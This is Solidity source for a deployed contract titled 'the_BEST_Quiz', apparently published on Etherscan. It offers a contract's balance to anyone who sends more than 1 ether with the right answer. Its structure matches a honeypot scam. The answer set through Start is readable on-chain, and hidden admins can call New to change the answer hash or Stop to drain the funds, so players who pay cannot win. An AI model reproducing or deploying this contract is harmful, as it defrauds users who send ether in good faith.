/**
 *Submitted for verification at Etherscan.io on 2025-12-02
 * the deployed contract: 0xE1C46c921b79Ae1782f95fe627Fc8850e973ba58
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract the_BEST_Quiz {
    string public question;
    bytes32 responseHash;
    mapping(bytes32 => bool) admin;

    constructor(bytes32[] memory admins) {
        for (uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin() {
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function Try(string memory _response) public payable {
        require(msg.sender == tx.origin);

        if (responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function Start(string calldata _question, string calldata _response) public payable isAdmin {
        if (responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
        responseHash = 0x0;
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    fallback() external {}
}
